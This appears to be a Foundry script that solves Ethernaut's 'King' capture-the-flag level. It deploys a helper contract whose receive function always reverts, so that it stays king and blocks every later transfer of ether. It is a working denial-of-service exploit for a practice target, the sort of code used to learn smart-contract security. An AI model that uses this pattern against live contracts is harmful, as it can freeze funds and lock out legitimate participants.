// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {King} from "../../challenge-contracts/09-King.sol";

contract KingSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x3049C00639E6dfC269ED1451764a046f7aE500c6;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        // NOTE Must send at least 0.001 ETH
        address challengeInstance = __createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Get the King contract and prize amount.
        King king = King(payable(challengeInstance));
        uint prize = king.prize();

        // Step 2: Deploy KingForever contract;
        KingForever myKing = new KingForever{value: prize + 1 wei}(
            challengeInstance
        );
        address myKingAddress = address(myKing);

        // Step 3: Call `sendEther()` function of the KingForever contract;
        bool isSuccess = myKing.sendEther();
        require(isSuccess, "sendEther() failed");

        // Step 4: Confirm that `myKingAddress` has successfully become king of the King contract.
        require(king._king() == myKingAddress, "King check failed");

        // Step 5: Send more ether to King contract;
        (bool isTransferSuccess, ) = payable(challengeInstance).call{
            value: prize + 2 wei
        }("");
        require(!isTransferSuccess, "Send ether succeeded");
        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(9));
    }
}

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Extra Contract)
// Additional contract codes to help solve this puzzle
////////////////////////////////////////////////////////////////////////////////////
contract KingForever {
    address private _receipient;

    constructor(address receipient) payable {
        _receipient = receipient;
    }

    function sendEther() external returns (bool isSuccess) {
        (isSuccess, ) = payable(_receipient).call{value: address(this).balance}(
            ""
        );
        return isSuccess;
    }

    receive() external payable {
        revert();
    }
}

////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Extra Contract)
////////////////////////////////////////////////////////////////////////////////////
